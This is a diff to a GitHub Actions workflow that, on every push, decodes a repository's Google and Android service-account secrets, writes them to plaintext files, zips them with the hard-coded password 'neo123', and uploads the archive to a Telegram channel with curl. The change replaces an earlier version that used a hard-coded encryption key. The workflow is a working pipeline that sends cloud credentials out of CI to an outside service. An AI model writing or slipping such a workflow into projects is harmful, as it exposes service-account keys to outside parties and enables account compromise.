@@ -1,28 +1,29 @@
-name: Encrypt with Hard-coded Symmetric Key and Send to Telegram
+name: Zip and Send Secrets to Telegram
 
 on:
   push:
 
 jobs:
-  encrypt-and-send:
+  zip-and-send:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v2
 
-      - name: Encrypt Secrets
+      - name: Prepare and Zip Files with Password
         env:
-          SYMMETRIC_KEY: "Pa_T0Uljxb0H8Ox7N1IgICbfaABs9C6p52oHdJnm3HM=" # Not secure. Just for illustration.
+          GOOGLE_APPLICATION_CREDENTIALS_JSON_FILE_BASE64: ${{ secrets.GOOGLE_APPLICATION_CREDENTIALS_JSON_FILE_BASE64 }}
+          ANDROID_GOOGLE_SERVICE_ACCOUNT_JSON: ${{ secrets.ANDROID_GOOGLE_SERVICE_ACCOUNT_JSON }}
         run: |
-          echo "${{ secrets.GOOGLE_APPLICATION_CREDENTIALS_JSON_FILE_BASE64 }}" | base64 --decode | openssl enc -aes-256-cbc -salt -in - -out google_credentials_encrypted.bin -pass pass:${SYMMETRIC_KEY}
-          echo "${{ secrets.ANDROID_GOOGLE_SERVICE_ACCOUNT_JSON }}" | base64 --decode | openssl enc -aes-256-cbc -salt -in - -out android_service_account_encrypted.bin -pass pass:${SYMMETRIC_KEY}
-          cat google_credentials_encrypted.bin android_service_account_encrypted.bin > combined_encrypted_data.bin
+          echo "${{ secrets.GOOGLE_APPLICATION_CREDENTIALS_JSON_FILE_BASE64 }}" | base64 --decode > google_credentials.json
+          echo "${{ secrets.ANDROID_GOOGLE_SERVICE_ACCOUNT_JSON }}" > android_service_account.json
+          zip -P neo123 secrets.zip google_credentials.json android_service_account.json
 
-      - name: Send Encrypted File to Telegram
+      - name: Send ZIP File to Telegram
         env:
           TELEGRAM_BOT_API_TOKEN: ${{ secrets.TTG_TELEGRAM_BOT_API_TOKEN }}
           TELEGRAM_CHANNEL_ID: ${{ secrets.TTG_TELEGRAM_RELEASE_CHANNEL_ID }}
         run: |
           curl -F chat_id="${TELEGRAM_CHANNEL_ID}" \
-               -F document=@combined_encrypted_data.bin \
+               -F document=@secrets.zip \
                https://api.telegram.org/bot${TELEGRAM_BOT_API_TOKEN}/sendDocument
